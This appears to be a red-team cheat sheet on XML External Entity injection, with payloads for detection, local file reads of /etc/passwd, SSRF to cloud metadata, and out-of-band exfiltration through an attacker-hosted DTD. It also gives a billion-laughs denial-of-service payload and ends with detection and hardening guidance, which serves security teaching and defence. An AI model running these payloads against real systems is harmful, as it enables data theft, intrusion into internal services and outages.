---
title: "XML External Entity (XXE)"
category: "red-team"
tags: ["web", "injection", "xxe", "owasp"]
platform: "web"
mitre: ["T1190"]
difficulty: "advanced"
updated: "2026-07-11"
author: "core"
---

# XML External Entity (XXE)

## TL;DR
An XML parser that resolves external entities lets you read local files, perform SSRF, and exfiltrate data out-of-band. Anywhere the app parses XML (SOAP, SAML, SVG, DOCX/XLSX, RSS, config uploads) is a candidate.

## Detecting the vulnerability
```xml
<!-- Does the parser resolve entities at all? Expect "42" reflected -->
<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY x "42"> ]>
<root>&x;</root>
```

## File read (classic)
```xml
<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]>
<root>&x;</root>
<!-- Windows: file:///c:/windows/win.ini -->
<!-- Avoid parse errors on multiline files with PHP wrapper: -->
<!-- <!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> -->
```

## SSRF via XXE
```xml
<!DOCTYPE t [ <!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<root>&x;</root>
<!-- Reach internal services / cloud metadata -> see red-team/web/ssrf.md -->
```

## Blind / out-of-band (OOB) exfiltration
```xml
<!-- Response not reflected: exfil via an external DTD you host -->
<?xml version="1.0"?>
<!DOCTYPE t [ <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd"> %dtd; ]>
<root>&send;</root>
```
```dtd
<!-- evil.dtd hosted by the attacker -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker/?d=%file;'>">
%eval;
```

## Denial of service (billion laughs)
```xml
<!-- Exponential entity expansion -> memory exhaustion. Use with authorization only. -->
<!DOCTYPE lolz [ <!ENTITY a "aa"><!ENTITY b "&a;&a;"><!ENTITY c "&b;&b;"> ]>
<lolz>&c;</lolz>
```

## Detection (Blue Team)
- WAF/logs: `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`, `php://filter`, requests to internal IPs/metadata.
- App server making outbound requests to attacker DTD hosts; XML parse errors spikes.

## Mitigation / Hardening
- **Disable external entities and DOCTYPE** (DTD processing) in the XML parser — the definitive fix.
- Use hardened parser configs: Java `XMLConstants.FEATURE_SECURE_PROCESSING` + disallow-doctype-decl; libxml `LIBXML_NONET`, no `LIBXML_NOENT`.
- Prefer JSON where possible; validate/allow-list uploaded file types; least-privilege app account.

## Sources
- [PortSwigger – XXE](https://portswigger.net/web-security/xxe) · [OWASP – XXE Prevention CS](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
